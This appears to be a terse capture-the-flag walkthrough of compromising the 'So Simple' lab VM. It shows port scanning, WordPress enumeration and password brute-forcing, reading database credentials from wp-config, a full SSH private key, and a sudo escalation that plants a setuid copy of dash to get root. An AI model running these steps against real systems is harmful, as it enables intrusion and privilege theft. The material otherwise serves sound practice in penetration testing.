???(kali?kali)-[~]
??$ nmap $ip -sC -sV -p- -oA initial
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-12 05:56 +0000
Nmap scan report for 192.168.56.78
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)
|   256 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)
|_  256 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: So Simple
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds

gobuster
<img width="874" height="503" alt="image" src="https://github.com/user-attachments/assets/7792411b-14a1-43c4-9e8a-428a0b267f52" />
<img width="1438" height="760" alt="image" src="https://github.com/user-attachments/assets/0d435085-8728-466c-ba83-f7f370433df5" />

wp-content           (Status: 301) [Size: 329] [--> http://192.168.56.78/wordpress/wp-content/]
wp-includes          (Status: 301) [Size: 330] [--> http://192.168.56.78/wordpress/wp-includes/]
wp-admin             (Status: 301) [Size: 327] [--> http://192.168.56.78/wordpress/wp-admin/]

wpscan --url "http://192.168.56.78/wordpress" --enumerate
<img width="775" height="392" alt="image" src="https://github.com/user-attachments/assets/d7b15e06-1abd-4140-93a9-01e94e06caea" />

wpscan got us to wp-content/uploads. and seeing the name max here, we can use it to bruteforce.

wpscan --url "http://192.168.56.78/word[ress" -U max -P rockyou.txt
<img width="347" height="48" alt="image" src="https://github.com/user-attachments/assets/5cfacc78-f3c9-4713-95f2-96b93941dc45" />

wpscan --url http://192.168.55.78/wordpress/ --enumerate p,u --plugins-detection aggressive
[+] social-warfare
 | Location: http://192.168.55.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2025-03-18T09:37:00.000Z
 | Readme: http://192.168.55.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 | [!] The version is out of date, the latest version is 4.5.6
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.55.78/wordpress/wp-content/plugins/social-warfare/, status: 200
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.55.78/wordpress/, Match: 'Social Warfare** v3.5.0**'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.55.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.55.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.55.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.55.78/wordpress/wp-content/plugins/social-warfare/readme.txt


<img width="879" height="167" alt="image" src="https://github.com/user-attachments/assets/49b0f4f1-adc6-40a7-aa6b-dbe246bb3080" />
<img width="673" height="123" alt="image" src="https://github.com/user-attachments/assets/b9769f7a-2799-4486-9bc0-7968f24d27a6" />

cat wp-config
/** MySQL database username */
define( 'DB_USER', 'wp_user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password' );

mysql -uwp_user -ppassword

navigate to wp_users
retrieve admin hash
$P$BqOIi8a7Jtcidgsi9y9WXw9UIfqD4q1 
save to hashes file

<img width="716" height="328" alt="image" src="https://github.com/user-attachments/assets/6cf62e77-9dca-414c-bf09-c6b311da3a5c" />

ps aux | grep -i 'root'

root         843  0.0  0.1   5568  2868 ?        Ss   09:47   0:00 /usr/sbin/cron -f

in /home/max/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

chmod 600 key
ssh -i key max@$ip

get into steven
<img width="1015" height="188" alt="image" src="https://github.com/user-attachments/assets/373e4b63-aab1-407c-8d4b-2a650a239dc8" />

steven sudo -l but /opt file is missing
<img width="991" height="201" alt="image" src="https://github.com/user-attachments/assets/fdb8fa12-c83a-4c6e-9d8a-89b0464c8423" />

create file in /opt/tools/server-health.sh
chmod +x server-health.sh

#!/bin/bash

cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash 

sudo -u root /opt/tools/server-health.sh

cd /var/tmp
./dash -p (-p for persistant user)

cat /root/proof.txt

